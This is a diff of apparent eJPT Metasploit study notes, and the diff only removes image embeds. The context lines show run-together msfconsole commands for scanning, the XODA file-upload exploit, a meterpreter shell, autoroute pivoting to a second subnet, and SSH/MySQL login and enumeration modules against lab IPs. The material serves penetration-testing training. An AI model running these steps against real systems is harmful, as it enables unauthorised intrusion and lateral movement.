@@ -22,13 +22,13 @@ service postgresql startmsfconsole
 
 db\_statusworkspace -a Win2k12db\_import /root/windows\_server\_2012\[\*] Importing 'Nmap XML' data\[\*] Import: Parsing with 'Nokogiri v1.10.7'\[\*] Importing host 10.2.18.161\[\*] Successfully imported /root/windows\_server\_2012hostsservicesvulnslootcredsnotes
 
-<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ba67b9abca052938ff18e17b7f35afdab9badf6f%2Fimage-20230412190333138.png?alt=media" alt=""><figcaption></figcaption></figure>
+
 
 * Perform an `nmap` scan _within the MSF Console and import the results in a dedicated workspace_
 
 workspace -a nmap\_MSFdb\_nmap -Pn -sV -O \<TARGET\_IP>
 
-<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-90d3514d0aea7cc72d1451e9439952f4b724e2d5%2Fimage-20230412190726940.png?alt=media" alt=""><figcaption></figcaption></figure>
+
 
 #### ​[Port Scanning](https://www.offsec.com/metasploit-unleashed/port-scanning/)​ <a href="#port-scanning" id="port-scanning"></a>
 
@@ -44,13 +44,13 @@ MSF **Auxiliary modules** are used during the information gathering (similar to 
 
 service postgresql start && msfconsole -qworkspace -a Port\_scansearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.41.167.3runcurl 192.41.167.3
 
-<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-f9bb00e236dcbcacb2dd85e5f4f8181ca1810f97%2Fimage-20230412220747788.png?alt=media" alt=""><figcaption></figcaption></figure>
+
 
 * Exploitation
 
 search xodause exploit/unix/webapp/xoda\_file\_uploadset RHOSTS 192.41.167.3set TARGETURI /run
 
-<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-be8eaadffd478211a6c3c787bbd54c2ffb0dd4e4%2Fimage-20230412221111369.png?alt=media" alt=""><figcaption></figcaption></figure>
+
 
 * Perform a network scan on the second target
 
@@ -60,7 +60,7 @@ meterpreter > shell/bin/bash -iifconfig# 192.26.158.2 Local Lan subnet IPexit
 
 run autoroute -s 192.26.158.2backgroundsearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.26.158.3run# the port scan will be performed through the first target system using the route\[+] 192.26.158.3: - 192.26.158.3:22 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:21 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:80 - TCP OPEN
 
-<figure><img src="https://2946054920-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-67e7adb134ca47fb1df4ff6f49abb7370d8802a9%2Fimage-20230412221528898.png?alt=media" alt=""><figcaption></figcaption></figure>
+
 
 * Upload and run `nmap` against the second target, from the first target machine
 
@@ -198,7 +198,7 @@ search type:auxiliary name:mysqluse auxiliary/scanner/mysql/mysql\_versionoption
 
 * Check the MySQL Enumerated data within MSF:
 
-hostsserviceslootcreds![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e00dc1815b532662bee3be7fd6657f8eccd1abd4%2Fimage-20230413133324466.png?alt=media)
+hostsserviceslootcreds
 
 **​**[**SSH**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/ssh-enum)**​**
 
@@ -216,7 +216,7 @@ search ssh\_loginuse auxiliary/scanner/ssh/ssh\_login# for password authenticati
 
 * This module sets up SSH sessions
 
-![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-7e5cd4807505d1993711dd2568be44f6427b7d0d%2Fimage-20230413143027661.png?alt=media)
+
 
 > **`auxiliary/scanner/ssh/ssh_enumusers`**
 
